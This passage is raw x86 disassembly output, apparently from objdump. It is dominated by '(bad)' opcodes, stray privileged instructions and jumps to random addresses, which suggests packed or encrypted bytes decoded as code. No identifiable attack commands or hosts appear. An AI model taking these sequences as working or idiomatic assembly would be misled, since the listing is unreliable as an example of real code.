  40b912:	idiv   BYTE PTR [esi]
  40b914:	cld    
  40b915:	repnz lods al,BYTE PTR ds:[esi]
  40b917:	test   ah,bh
  40b919:	in     eax,0xfe
  40b91b:	je     0x40b932
  40b91d:	out    dx,al
  40b91e:	(bad)  
  40b91f:	es and eax,0xfc1eacb9
  40b925:	in     eax,0xb4
  40b927:	sbb    DWORD PTR [esi+eiz*8],eax
  40b92a:	inc    BYTE PTR [ecx]
  40b92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b92d:	mov    eax,0xa07c06fe
  40b932:	clc    
  40b933:	adc    bh,ch
  40b935:	out    0xfe,eax
  40b937:	idiv   BYTE PTR [edi+0x70]
  40b93a:	cld    
  40b93b:	add    DWORD PTR [eax],eax
	...
  40b965:	add    BYTE PTR [eax-0x7b17003c],ch
  40b96b:	sbb    DWORD PTR [eax],ecx
  40b96d:	jmp    0x6b2c8a5a
  40b972:	jbe    0x40b95b
  40b974:	imul   ebp,ecx,0x3cff48d3
  40b97a:	dec    edx
  40b97b:	repz test al,0x93
  40b97e:	jg     0x40b966
  40b980:	mov    BYTE PTR [esi+edi*2],ch
  40b983:	jae    0x40b922
  40b985:	adc    ch,bh
  40b987:	in     eax,0xfd
  40b989:	sbb    al,0x4a
  40b98b:	repz adc eax,0xfee67f9f
  40b991:	sbb    al,0x7e
  40b993:	out    0x74,al
  40b995:	loope  0x40b9ac
  40b997:	rsm    
  40b999:	add    al,al
  40b99b:	fwait
  40b99c:	leave  
  40b99d:	ret    0x599b
  40b9a0:	push   ebp
  40b9a1:	mov    eax,ebx
  40b9a3:	ffreep st(3)
  40b9a5:	cld    
  40b9a6:	cmp    eax,0x20146a5f
  40b9ab:	scas   al,BYTE PTR es:[edi]
  40b9ac:	push   es
  40b9ad:	call   0x403151
  40b9b2:	push   ds
  40b9b3:	push   ds
  40b9b4:	sti    
  40b9b5:	push   0xbeef5997
  40b9ba:	(bad)  
  40b9bb:	xchg   edx,eax
  40b9bc:	pop    ecx
  40b9bd:	inc    ecx
  40b9be:	addr16 mov cl,0xbb
  40b9c1:	pop    ecx
  40b9c2:	xchg   esi,eax
  40b9c3:	pop    ecx
  40b9c4:	push   DWORD PTR [ebp+0x5f]
  40b9c7:	xor    DWORD PTR [ebx-0x2a],esp
	...
  40b9f2:	add    BYTE PTR [eax],al
  40b9f4:	and    BYTE PTR [edi+edi*8+0x759c3375],bl
  40b9fb:	or     BYTE PTR [edi],bh
  40b9fd:	ret    0xffa9
  40ba00:	xor    BYTE PTR [edx+0xe2704c2],dl
  40ba06:	mov    ch,ah
  40ba08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba09:	xchg   ebx,eax
  40ba0a:	fdiv   st,st(7)
  40ba0c:	xor    BYTE PTR [ebp+ecx*4-0x1f6ecbb],bl
  40ba13:	jne    0x40ba28
  40ba15:	pushf  
  40ba16:	xor    eax,0xff184fc3
  40ba1b:	out    0x41,eax
  40ba1d:	sar    bh,0xff
  40ba20:	sbb    al,0x99
  40ba22:	jne    0x4113da
  40ba28:	cwde   
  40ba29:	sbb    eax,0x58d700f7
  40ba2e:	add    bh,al
  40ba30:	sbb    ah,BYTE PTR [ebx]
  40ba32:	inc    DWORD PTR [edi]
  40ba34:	out    0x58,eax
  40ba36:	push   0x0
  40ba38:	sub    eax,0x3e006a5f
  40ba3d:	pop    eax
  40ba3e:	add    al,0x8d
  40ba40:	jnp    0x40ba10
  40ba42:	ror    BYTE PTR [ebx+eax*8-0x4e00c79a],cl
  40ba49:	inc    edx
  40ba4a:	inc    ecx
  40ba4b:	jne    0x40b9f3
  40ba4d:	ins    DWORD PTR es:[edi],dx
  40ba4e:	mov    dh,0xfb
  40ba50:	xchg   esi,eax
  40ba51:	repnz cdq 
  40ba53:	add    BYTE PTR [esi],bh
  40ba55:	jmp    0x412e9c
	...
  40ba82:	cmp    ecx,DWORD PTR [ebx-0xdc1fe6d]
  40ba88:	stos   BYTE PTR es:[edi],al
  40ba89:	sahf   
  40ba8a:	div    BYTE PTR [edx-0x120c00fe]
  40ba90:	sub    dl,BYTE PTR [ecx-0x52]
  40ba93:	and    eax,0x42b55040
  40ba98:	mov    es,WORD PTR [ebp-0xbfd296]
  40ba9e:	out    dx,al
  40ba9f:	lahf   
  40baa0:	sub    al,BYTE PTR [ecx-0x72]
  40baa3:	inc    ebp
  40baa4:	inc    eax
  40baa5:	mov    ebx,eax
  40baa7:	inc    edx
  40baa8:	cmp    bh,bh
  40baaa:	inc    ecx
  40baab:	pop    edx
  40baac:	cwde   
  40baad:	lods   al,BYTE PTR ds:[esi]
  40baae:	cmp    DWORD PTR [ebp-0x72],ebx
  40bab1:	test   DWORD PTR [esi],edx
  40bab3:	in     eax,dx
  40bab4:	dec    DWORD PTR ds:[esi+0x7f5925da]
  40babb:	repnz aas 
  40babd:	mov    ch,0xe
  40babf:	add    eax,0x4f11ff3f
  40bac4:	inc    ebx
  40bac5:	dec    eax
  40bac6:	jg     0x40baba
  40bac8:	sub    dl,BYTE PTR [edx-0x76c0eb2f]
  40bace:	ret    
  40bacf:	adc    eax,0x87f1ff37
  40bad4:	add    al,0x68
  40bad6:	or     eax,0xe0ffc54b
  40badb:	outs   dx,BYTE PTR ds:[esi]
  40badc:	xor    al,0xf7
  40bade:	fstp   DWORD PTR [edx-0x5a]
  40bae1:	aas    
  40bae2:	or     ebx,DWORD PTR [eax]
  40bae4:	xor    ebp,eax
	...
  40bb0e:	add    BYTE PTR [eax],al
  40bb10:	leave  
  40bb11:	sti    
  40bb12:	sbb    al,0x6f
  40bb14:	shl    ebx,0x5f
  40bb17:	mov    DWORD PTR [edx+0x243f85eb],ebp
  40bb1d:	pop    ebx
  40bb1e:	adc    DWORD PTR [eax+0x7],esp
  40bb21:	call   0x3f75:0xeaeb3ee9
  40bb28:	cdq    
  40bb29:	jecxz  0x40bb46
  40bb2b:	inc    ebx
  40bb2c:	push   es
  40bb2d:	call   0x3f55:0xb3f02be9
  40bb34:	mov    bh,0xdd
  40bb36:	inc    eax
  40bb37:	aaa    
  40bb38:	jns    0x40bb1d
  40bb3a:	jae    0x40bac5
  40bb3c:	xchg   edx,eax
  40bb3d:	jmp    0x40bb7c
  40bb3f:	aas    
  40bb40:	push   cs
  40bb41:	jae    0x40bb8a
  40bb43:	(bad)  
  40bb45:	pop    edx
  40bb46:	cs jns 0x40bb97
  40bb49:	jmp    0x40bb70
  40bb4b:	aas    
  40bb4c:	push   ecx
  40bb4d:	sub    eax,0x5afecc2a
  40bb52:	add    ebx,esi
  40bb54:	nop
  40bb55:	jecxz  0x40bb64
  40bb57:	or     edi,esi
  40bb59:	addr16 loopne 0x40bade
  40bb5c:	repz push ebp
  40bb5f:	sub    DWORD PTR ds:[eax+0x7c],ebx
  40bb63:	adc    esp,DWORD PTR [ecx]
  40bb65:	sub    al,0x5e
  40bb67:	mov    DWORD PTR [esi],ebx
  40bb69:	jmp    0x40bb50
  40bb6b:	outs   dx,BYTE PTR ds:[esi]
  40bb6d:	repz call 0xc223c4e2
  40bb73:	pop    ss
	...
  40bb9c:	add    BYTE PTR [eax],al
  40bb9e:	xor    eax,0x8e06551b
  40bba3:	repz mov esp,0xa5e2f16a
  40bba9:	mov    dh,bl
  40bbab:	jmp    0xe900:0x4820b5ff
  40bbb2:	cmp    eax,0x88dbcde
  40bbb7:	loop   0x40bbb7
  40bbb9:	jmp    0x54c41c4f
  40bbbe:	adc    edx,ebp
  40bbc0:	dec    BYTE PTR [esi+0x6a75673d]
  40bbc6:	mov    esi,0x687ef6f3
  40bbcb:	pop    ebx
  40bbcc:	je     0x40bbd3
  40bbce:	aam    0xe2
  40bbd0:	mov    esp,DWORD PTR [ebp+esi*8-0x17]
  40bbd4:	(bad)  
  40bbd5:	ins    WORD PTR es:[edi],dx
  40bbd7:	loope  0x40bb8d
  40bbd9:	inc    ebp
  40bbda:	push   eax
  40bbdb:	loop   0x40bbdb
  40bbdd:	inc    ecx
  40bbde:	test   DWORD PTR [edi],eax
  40bbe0:	dec    DWORD PTR [esi+0x44]
  40bbe3:	sbb    esi,DWORD PTR [ebp+ebx*4-0x44]
  40bbe7:	mov    al,ds:0xe22836d7
  40bbec:	(bad)  
  40bbed:	mov    esp,0xe9007a74
  40bbf2:	sub    BYTE PTR [ecx-0xcba6302],ah
  40bbf8:	push   ecx
  40bbf9:	push   ecx
  40bbfa:	or     dl,ah
  40bbfc:	(bad)  
  40bbfd:	pop    esp
  40bbfe:	adc    edx,ebp
  40bc00:	dec    BYTE PTR [esi]
	...
  40bc2a:	add    BYTE PTR [eax],al
  40bc2c:	js     0x40bc96
  40bc2e:	or     BYTE PTR [ecx],dl
  40bc30:	fwait
  40bc31:	mov    bl,0xfe
  40bc33:	(bad)  
  40bc34:	imul   ebp,DWORD PTR [eax-0x1d9c0119],0xfffffffe
  40bc3b:	je     0x40bc82
  40bc3d:	repz xchg edi,eax
  40bc3f:	xchg   ecx,eax
  40bc40:	push   ebx
  40bc41:	loop   0x40bc41
  40bc43:	xchg   esp,eax
  40bc44:	push   0xffffffea
  40bc46:	(bad)  
  40bc47:	(bad)  
  40bc48:	inc    ebx
  40bc49:	test   al,0xe3
  40bc4b:	(bad)  
  40bc4c:	cmp    esp,edx
  40bc4e:	inc    BYTE PTR [eax]
  40bc50:	xor    cl,BYTE PTR [edi-0x18]
  40bc53:	pop    eax
  40bc54:	iret   
  40bc55:	pop    ds
  40bc56:	(bad)  
  40bc57:	jmp    DWORD PTR [edx+0x37]
  40bc5a:	idiv   edi
  40bc5c:	test   al,0x1f
  40bc5e:	jne    0x40bc68
  40bc60:	scas   eax,DWORD PTR es:[edi]
  40bc61:	inc    edx
  40bc62:	test   al,0xff
  40bc64:	test   al,0x1f
  40bc66:	mov    ch,0xe4
  40bc68:	mov    al,ds:0x6fe8ff1f
  40bc6d:	je     0x40bc6e
  40bc6f:	(bad)  
  40bc70:	mov    eax,0x28f7ec69
  40bc75:	and    al,ch
  40bc77:	dec    ebp
  40bc78:	cld    
  40bc79:	pop    ds
  40bc7a:	(bad)  
  40bc7b:	call   DWORD PTR [edx+0x2f]
  40bc7e:	idiv   edi
  40bc80:	sbb    BYTE PTR [edi],ch
  40bc82:	inc    edx
  40bc83:	stos   DWORD PTR es:[edi],eax
  40bc84:	call   0xe7f6bba8
  40bc89:	daa    
  40bc8a:	(bad)  
  40bc8b:	(bad)  
  40bc8c:	jmp    edi
  40bc8e:	test   eax,0xff
	...
  40bcb7:	add    BYTE PTR [eax],al
  40bcb9:	add    al,bh
  40bcbb:	pop    ds
  40bcbc:	inc    ebp
  40bcbd:	clc    
  40bcbe:	push   cs
  40bcbf:	sbb    eax,0x2028fffd
  40bcc4:	jne    0x40bcc2
  40bcc6:	dec    DWORD PTR [ebx]
  40bcc8:	xchg   esi,eax
  40bcc9:	add    BYTE PTR [edi-0x6c],ah
  40bccc:	ret    0x5708
  40bccf:	or     BYTE PTR [edx-0xb6d2b14],cl
  40bcd5:	call   edx
  40bcd7:	push   eax
  40bcd8:	call   0x984fc8
  40bcdd:	mov    edx,esp
  40bcdf:	and    al,0xff
  40bce1:	jne    0x40bd12
  40bce3:	xor    eax,0x2028ab21
  40bce8:	mov    DWORD PTR [ebp+0x1b],eax
  40bceb:	and    BYTE PTR [ebp-0x4],dh
  40bcee:	call   0x3f40b39c
  40bcf3:	jg     0x40bd05
  40bcf5:	call   0xff7c8631
  40bcfa:	inc    ebp
  40bcfb:	mov    dl,0xb6
  40bcfd:	cmp    eax,0x6a3837b7
  40bd02:	ds ja  0x40bccb
  40bd05:	rep outs dx,BYTE PTR ds:[esi]
  40bd07:	mov    cl,0xb5
  40bd09:	sti    
  40bd0a:	out    0x53,al
  40bd0c:	pop    eax
  40bd0d:	dec    ecx
  40bd0f:	in     eax,dx
  40bd10:	inc    edx
  40bd11:	je     0x40bd2a
  40bd13:	pop    edx
  40bd14:	add    al,0x10
  40bd16:	test   eax,0x46753c90
  40bd1b:	retf   0xa786
	...
  40bd46:	add    BYTE PTR [eax],al
  40bd48:	test   eax,0xa6753c61
  40bd4d:	imul   esi,DWORD PTR [esi+0xae7990b],0x3bd1e2e8
  40bd57:	dec    DWORD PTR [ecx+0xbff3707]
  40bd5d:	xchg   BYTE PTR [esi*2-0x586265ba],bh
  40bd64:	jno    0x40bcff
  40bd66:	cmp    al,0x75
  40bd68:	push   0xffffff8a
  40bd6a:	ins    BYTE PTR es:[edi],dx
  40bd6b:	stos   BYTE PTR es:[edi],al
  40bd6c:	popa   
  40bd6d:	sub    DWORD PTR [edx-0x3e],ecx
  40bd70:	inc    esi
  40bd71:	repnz aad 0x8a
  40bd74:	bound  esi,QWORD PTR [ebp+0x47]
  40bd77:	call   0xbf6fe6c
  40bd7c:	push   esi
  40bd7d:	retf   
  40bd7e:	imul   edi,edi,0x39
  40bd81:	std    
  40bd82:	inc    edx
  40bd83:	jne    0x40bdc0
  40bd85:	mov    eax,0xf236c249
  40bd8a:	lea    eax,[ebp+0x2e]
  40bd8d:	ret    0x753b
  40bd90:	dec    edx
  40bd91:	pop    edx
  40bd92:	call   0xe69bcf46
  40bd97:	paddd  mm1,QWORD PTR [edi+0x65]
  40bd9b:	sahf   
  40bd9c:	ds pop ebx
  40bd9e:	jmp    0xc12030dd
  40bda3:	mov    ah,BYTE PTR [edi+ebx*8-0x107c723b]
  40bdaa:	mov    ebp,0xb1
	...
  40bdd3:	add    BYTE PTR [eax],al
  40bdd5:	add    ch,ah
  40bdd7:	fistp  QWORD PTR [ebx]
  40bdd9:	sub    cl,bl
  40bddb:	gs mov cl,0x2c
  40bdde:	mov    dh,BYTE PTR [ebp+eiz*4-0x729a4ac5]
  40bde5:	das    
  40bde6:	ja     0x40be5b
  40bde8:	into   
  40bde9:	(bad)  
  40bdeb:	pop    edx
  40bdec:	aaa    
  40bded:	sub    al,0x92
  40bdef:	enter  0x3e8,0x35
  40bdf3:	sbb    esi,esp
  40bdf5:	add    eax,0x34621d95
  40bdfa:	cmp    BYTE PTR es:[ebx],dl
  40bdfd:	lds    edx,FWORD PTR [ecx+0x3e9102f7]
  40be03:	pop    ebx
  40be04:	jmp    0x33ac:0x4165b733
  40be0b:	test   DWORD PTR [eax-0x7d0cf7fd],ebp
  40be11:	xchg   edx,eax
  40be12:	ds pop ebx
  40be14:	repnz inc ebx
  40be16:	jmp    0x40be74
  40be18:	inc    edx
  40be19:	pop    ds
  40be1a:	les    ecx,FWORD PTR [edx+0x27]
  40be1d:	add    al,0x3e
  40be1f:	mov    edi,DWORD PTR [ebx+0x1df2d33a]
  40be25:	mov    cl,0x39
  40be27:	repz (bad) 
  40be2b:	fbstp  TBYTE PTR [edx+0x694bb9db]
  40be31:	cli    
  40be32:	sub    DWORD PTR [eax+0x3b],ebp
  40be35:	lods   al,BYTE PTR ds:[esi]
  40be36:	ds dec ebx
  40be38:	add    BYTE PTR [esi],al
	...
  40be62:	add    BYTE PTR [eax],al
  40be64:	xchg   esp,eax
  40be65:	fidiv  WORD PTR [ecx+eiz*8+0x65]
  40be69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6b:	out    0x44,al
  40be6d:	fidiv  WORD PTR [ebp+ebx*8+0x44]
  40be71:	push   0x56aed6ec
  40be76:	call   0xff1f1e29
  40be7b:	(bad)  
  40be7c:	scas   al,BYTE PTR es:[edi]
  40be7d:	repnz out 0xb9,eax
  40be80:	push   edx
  40be81:	fdivp  st(6),st
  40be83:	fs (bad) 
  40be85:	out    dx,al
  40be86:	dec    edi
  40be87:	shl    DWORD PTR [ebx+ebp*4],0xfe
  40be8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be8c:	sbb    BYTE PTR [ebx+0x5e],bl
  40be8f:	mov    al,0x7b
  40be91:	push   ebx
  40be92:	add    BYTE PTR [ecx+ecx*8],bh
  40be95:	out    dx,eax
  40be96:	and    BYTE PTR [ebp+0x13007169],0x4f
  40be9d:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40bea1:	push   ebp
  40bea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea3:	jbe    0x40bef9
  40bea5:	aam    0x44
  40bea7:	ins    DWORD PTR es:[edi],dx
  40bea8:	in     eax,0xe9
  40beaa:	pop    eax
  40beab:	test   al,0x3d
  40bead:	fidiv  WORD PTR [ecx+esi*8+0x55]
  40beb1:	mov    dh,0xfb
  40beb3:	push   esi
  40beb4:	xor    al,0x71
  40beb6:	add    cl,al
  40beb8:	xchg   BYTE PTR [ecx+eax*2+0x5a2395e9],al
  40bebf:	test   al,0x3d
  40bec1:	fidiv  WORD PTR [edx+ebp*1]
  40bec4:	test   DWORD PTR [ebx+0x4100],ebx
	...
  40bef2:	aam    0xae
  40bef4:	(bad)  
  40bef5:	cmp    BYTE PTR es:[ebx],bl
  40bef8:	je     0x40befd
  40befa:	xchg   edx,eax
  40befb:	inc    edx
  40befc:	pop    edx
  40befd:	test   al,0x3d
  40beff:	mov    ebp,eax
  40bf01:	bound  esp,QWORD PTR [esi-0x38ff0122]
  40bf07:	or     esi,edi
  40bf09:	jne    0x40bf3a
  40bf0b:	xor    ah,bl
  40bf0d:	(bad)  
  40bf0e:	adc    BYTE PTR [eax+ebp*8],ah
  40bf11:	mov    DWORD PTR [esi+0x21],edi
  40bf14:	jmp    FWORD PTR [edx+0x3d]
  40bf17:	das    
  40bf18:	fisubr DWORD PTR [ebp-0x3ff4dc20]
  40bf1e:	fwait
  40bf1f:	(bad)  
  40bf20:	data16 adc BYTE PTR ds:0xf4fff1a,ch
  40bf27:	mov    ecx,0xaea0ffab
  40bf2c:	sbb    bl,BYTE PTR [edx+0x26]
  40bf2f:	push   edi
  40bf30:	push   eax
  40bf31:	call   0x403562
  40bf36:	pop    es
  40bf37:	pop    es
  40bf38:	(bad)  
  40bf39:	jne    0x40bf0a
  40bf3b:	xor    DWORD PTR [ebx-0x17dc2f02],esi
  40bf41:	pop    ecx
  40bf42:	(bad)  
  40bf43:	and    edi,edi
  40bf45:	push   0xffffffa3
  40bf47:	xor    DWORD PTR [edx+0xb2420ad],ebp
  40bf4d:	rcr    BYTE PTR [ebx+0x2d1066fc],0x1a
  40bf54:	dec    DWORD PTR [edi+0x0]
	...
  40bf7f:	add    bh,ch
  40bf81:	call   0xaf21bf31
  40bf86:	sbb    bl,BYTE PTR [edx-0x5a]
  40bf89:	pop    ecx
  40bf8a:	push   eax
  40bf8b:	call   0x4035cc
  40bf90:	(bad)  
  40bf91:	or     esi,edi
  40bf93:	jne    0x40c004
  40bf95:	xor    DWORD PTR [ebx-0x17dbef02],eax
  40bf9b:	sub    DWORD PTR [esi+0x746aff23],edi
  40bfa1:	xor    DWORD PTR [edx-0x53],edi
  40bfa4:	and    BYTE PTR [ebx+ecx*1],ah
  40bfa7:	sar    BYTE PTR [esi],0xbe
  40bfaa:	frstor [edi+0x4e]
  40bfad:	test   al,0xc1
  40bfaf:	(bad)  
  40bfb0:	jns    0x40bffc
  40bfb2:	add    ch,BYTE PTR [ebp+0x1baade21]
  40bfb8:	je     0x40bf6d
  40bfba:	add    dl,BYTE PTR [eax+0x26]
  40bfbd:	jmp    0xfed4:0x2309ff66
  40bfc4:	mov    ebp,edx
  40bfc6:	sub    dl,BYTE PTR [ebx-0x8]
  40bfc9:	add    eax,0xdaf7e838
  40bfce:	aaa    
  40bfcf:	(bad)  
  40bfd0:	jmp    0x6c3ff7f4
  40bfd5:	jmp    0xc937:0xa5a06c2a
  40bfdc:	cld    
  40bfdd:	test   BYTE PTR [edx],0x55
  40bfe0:	mov    ch,0xc6
  40bfe2:	add    esp,0x0
	...
  40c00c:	add    BYTE PTR [eax],al
  40c00e:	loop   0x40bfd5
  40c010:	aaa    
  40c011:	dec    ebx
  40c013:	das    
  40c014:	cmp    BYTE PTR [eax-0x4f],dl
  40c017:	inc    edi
  40c018:	adc    al,0xff
  40c01a:	xor    esp,esi
  40c01c:	sub    al,BYTE PTR [ebx+ecx*8]
  40c01f:	repnz add cl,BYTE PTR [ebx]
  40c022:	jle    0x40c019
  40c024:	jge    0x40bfe4
  40c026:	aas    
  40c027:	repnz add al,bh
  40c02a:	add    edi,DWORD PTR [edx+0x3]
  40c02d:	add    BYTE PTR [esi],bh
  40c02f:	repnz aas 
  40c031:	inc    ebp
  40c032:	jb     0x40bfb9
  40c034:	add    BYTE PTR [eax],al
  40c036:	sbb    BYTE PTR ds:[ebx],al
  40c039:	push   0x3e
  40c03b:	or     BYTE PTR [ebx],al
  40c03d:	push   0x3e
  40c03f:	outs   dx,DWORD PTR ds:[esi]
  40c040:	mov    esi,0x7e76eef3
  40c045:	hlt    
  40c046:	dec    ecx
  40c047:	sub    eax,0x5b495038
  40c04c:	pushf  
  40c04d:	cmp    eax,DWORD PTR [ecx+0x66]
  40c050:	sbb    eax,0xe8c7102b
  40c055:	add    eax,DWORD PTR [ebp+0x1b]
  40c058:	xchg   ebp,eax
  40c059:	(bad)  
  40c05a:	push   ss
  40c05b:	(bad)  
  40c05d:	add    edi,DWORD PTR [esi]
  40c05f:	jae    0x40c0bf
  40c061:	retf   
  40c062:	jle    0x40c0bf
  40c064:	imul   BYTE PTR [ebp+0x67c5f341]
  40c06a:	or     esp,ebx
  40c06c:	cmp    BYTE PTR [ebx+0x3063cdee],cl
	...
  40c09a:	add    BYTE PTR [eax],al
  40c09c:	icebp  
  40c09d:	fcmovnbe st,st(5)
  40c09f:	aam    0x8f
  40c0a1:	repz cmc 
  40c0a3:	addr16 jmp 0xeec23084
  40c0a9:	jecxz  0x40c068
  40c0ab:	aaa    
  40c0ac:	out    0x6d,al
  40c0ae:	xor    DWORD PTR [edi],0xabe970d1
  40c0b4:	pop    edx
  40c0b5:	sub    DWORD PTR [eax],0x98a5c104
  40c0bb:	das    
  40c0bc:	mov    ecx,0x45b195db
  40c0c1:	repz sbb BYTE PTR [ebx-0x57],ch
  40c0c5:	fld    TBYTE PTR [edi-0x7f]
  40c0c8:	call   0x15b:0x24377de3
  40c0cf:	scas   al,BYTE PTR es:[edi]
  40c0d0:	neg    DWORD PTR [ecx-0x152cc917]
  40c0d6:	pop    ebp
  40c0d7:	aaa    
  40c0d8:	sbb    ebx,0x856607d3
  40c0de:	xor    BYTE PTR [edi],0x71
  40c0e1:	shl    DWORD PTR [ebx+0x24],1
  40c0e4:	jno    0x40c0c1
  40c0e6:	inc    ebp
  40c0e7:	stos   BYTE PTR es:[edi],al
  40c0e8:	popa   
  40c0e9:	jae    0x40c087
  40c0eb:	fsin   
  40c0ed:	pop    edx
  40c0ee:	add    BYTE PTR [esi],dh
  40c0f0:	iret   
  40c0f1:	jmp    0xf574:0xdc112ef6
  40c0f8:	adc    eax,0x711eab21
  40c0fd:	in     al,0x84
  40c0ff:	add    eax,0x0
	...
  40c128:	add    BYTE PTR [eax],al
  40c12a:	popa   
  40c12b:	(bad)  
  40c12d:	cmp    DWORD PTR ds:0xfaa36443,0xffffffda
  40c134:	std    
  40c135:	xor    al,0x52
  40c137:	sar    dh,cl
  40c139:	test   BYTE PTR [eax+0x50],0xc
  40c13d:	add    DWORD PTR [ecx],esi
  40c13f:	push   es
  40c140:	jmp    esi
  40c142:	mov    dl,0xe0
  40c144:	out    0xd6,eax
  40c146:	xor    dl,bl
  40c148:	imul   ebp,ecx,0x285a5aa5
  40c14e:	inc    edx
  40c14f:	fidiv  DWORD PTR [ecx+edi*4-0x410125f0]
  40c156:	mov    fs,WORD PTR [esi-0x18]
  40c159:	in     eax,dx
  40c15a:	fs (bad) 
  40c15d:	pusha  
  40c15e:	mov    esi,0x8a6f6b7
  40c163:	fidivr WORD PTR [ebp+eax*4-0x16012598]
  40c16a:	out    dx,al
  40c16b:	arpl   WORD PTR [ebx-0x12da2b4],ax
  40c171:	xchg   BYTE PTR ds:0x166a654f,bh
  40c177:	(bad)  
  40c178:	div    BYTE PTR [esi+0x48]
  40c17b:	pop    ebx
  40c17c:	je     0x40c18b
  40c17e:	mov    ebp,0x485ee818
  40c183:	(bad)  
  40c185:	aam    0x8c
  40c187:	inc    edx
  40c188:	add    cl,ch
  40c18a:	sbb    BYTE PTR [ecx],bl
  40c18c:	call   esp
	...
  40c1b6:	add    BYTE PTR [eax],al
  40c1b8:	xor    eax,0xb30065c3
  40c1bd:	xchg   ecx,eax
  40c1be:	(bad)  
  40c1bf:	call   edx
  40c1c1:	xor    edi,0x759108ff
  40c1c7:	or     bh,bh
  40c1c9:	push   ebx
  40c1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cb:	call   FWORD PTR [eax]
  40c1cd:	xchg   ecx,eax
  40c1ce:	mov    ch,0xe8
  40c1d0:	push   eax
  40c1d1:	xchg   ecx,eax
  40c1d2:	(bad)  
  40c1d3:	call   edx
  40c1d5:	gs call 0xffd24587
  40c1db:	jmp    DWORD PTR [edx+0x7a]
  40c1de:	idiv   edi
  40c1e0:	sbb    BYTE PTR [eax-0xfc0f78b],dl
  40c1e6:	mov    ds:0xb59018ff,eax
  40c1eb:	loopne 0x40c1cd
  40c1ed:	(bad)  
  40c1ee:	(bad)  
  40c1ef:	call   DWORD PTR [edx-0x3c6f1799]
  40c1f5:	(bad)  
  40c1f6:	(bad)  
  40c1f7:	call   edx
  40c1f9:	xor    dh,bh
  40c1fb:	(bad)  
  40c1fc:	clc    
  40c1fd:	(bad)  
  40c1fe:	jne    0x40c208
  40c200:	out    dx,eax
  40c201:	fsub   QWORD PTR [ebx-0x4a707701]
  40c207:	in     al,0x90
  40c209:	(bad)  
  40c20a:	(bad)  
  40c20b:	call   0x3ffa43
  40c210:	fmul   DWORD PTR [ecx-0x20]
  40c213:	test   eax,0x59e88f
  40c219:	nop
  40c21a:	(bad)  
  40c21b:	inc    DWORD PTR [eax]
	...
  40c245:	add    BYTE PTR [edx-0x7d],ah
  40c248:	idiv   edi
  40c24a:	sbb    BYTE PTR [edi-0x6ff758b2],al
  40c250:	push   DWORD PTR [ebp-0x7841]
  40c256:	out    dx,eax
  40c257:	fwait
  40c258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c259:	call   FWORD PTR [eax]
  40c25b:	nop
  40c25c:	mov    ch,0xdc
  40c25e:	cmp    DWORD PTR ds:0x5d6b56ff,esi
  40c265:	jmp    DWORD PTR [ecx+0x20]
  40c268:	outs   dx,DWORD PTR ds:[esi]
  40c269:	lock push ecx
  40c26b:	cwde   
  40c26c:	xor    eax,0x33bfcbff
  40c271:	jne    0x40c2a9
  40c273:	sbb    al,0xf7
  40c275:	std    
  40c276:	inc    ecx
  40c277:	xor    BYTE PTR ds:0x35722eb5,0xff
  40c27e:	es iret 
  40c280:	pop    ebx
  40c281:	jmp    FWORD PTR [ecx]
  40c283:	push   0xffffffbf
  40c285:	not    DWORD PTR [edi]
  40c287:	hlt    
  40c288:	xor    al,0xff
  40c28a:	sbb    edx,ebx
  40c28c:	lods   eax,DWORD PTR ds:[esi]
  40c28d:	sti    
  40c28e:	or     edx,DWORD PTR es:[eax+0x427b3e00]
  40c295:	or     al,0x3e
  40c297:	xchg   edi,eax
  40c298:	mov    esp,ebp
  40c29a:	mov    ebp,0x3e6a36fe
  40c29f:	sbb    al,0xe
  40c2a1:	push   DWORD PTR [ebx-0x46]
  40c2a4:	sub    ch,BYTE PTR [esi]
  40c2a6:	call   0x0:0x8933a1
	...
  40c2d1:	add    BYTE PTR [eax],al
  40c2d3:	add    BYTE PTR [ebx+0x7489ab16],al
  40c2d9:	add    DWORD PTR [eax+ebp*2],0x3c
  40c2dd:	ret    0x8002
  40c2e0:	shl    DWORD PTR [edi+0xc],0xe8
  40c2e4:	mov    cl,0xf7
  40c2e6:	xor    edi,edi
  40c2e8:	es cmp al,0xd9
  40c2eb:	inc    eax
  40c2ec:	ds jmp 0x833785df
  40c2f2:	add    al,0xff
  40c2f4:	adc    ecx,edx
  40c2f6:	sub    ah,ah
  40c2f8:	xchg   ebx,eax
  40c2f9:	push   ecx
  40c2fa:	xor    al,0xff
  40c2fc:	adc    eax,DWORD PTR [esi+0x34]
  40c2ff:	jne    0x40c337
  40c301:	pop    ebx
  40c302:	push   ecx
  40c303:	ret    0xd89d
  40c306:	pop    ebp
  40c307:	dec    edx
  40c308:	jl     0x40c369
  40c30a:	jmp    0x680877dd
  40c30f:	aas    
  40c310:	adc    al,0x45
  40c313:	xor    al,0xcb
  40c315:	push   ds
  40c316:	cmp    eax,0xd94e50d3
  40c31b:	xor    al,0xd3
  40c31d:	inc    cx
  40c31f:	pop    edx
  40c320:	lods   al,BYTE PTR ds:[esi]
  40c321:	pop    ebx
  40c322:	jmp    0x64a8c12f
  40c327:	jne    0x40c368
  40c329:	pop    ebx
  40c32a:	jmp    0xe914466b
  40c32f:	add    edi,DWORD PTR [esi]
  40c331:	pop    ebx
  40c332:	cs mov esi,0x3e5d80d
	...
  40c360:	add    BYTE PTR [eax],al
  40c362:	ds inc ebp
  40c364:	jmp    0xe982cd12
  40c369:	test   eax,0x382be701
  40c36e:	mov    fs,esi
  40c370:	arpl   WORD PTR [eax],di
  40c372:	jmp    0xe915994e
  40c377:	dec    ebp
  40c378:	shl    DWORD PTR [ebx],1
  40c37a:	imul   edx,edi,0xffffffd0
  40c37d:	pop    edi
  40c37e:	lods   al,BYTE PTR ds:[esi]
  40c37f:	pop    edx
  40c380:	jmp    0xec8f5583
  40c385:	sbb    al,0xbf
  40c387:	pop    ecx
  40c388:	jmp    0x31391990
  40c38d:	lds    edi,FWORD PTR [ecx-0x59ebec28]
  40c393:	(bad)  
  40c394:	aas    
  40c395:	xor    ebp,DWORD PTR [ecx-0x4cab9dd6]
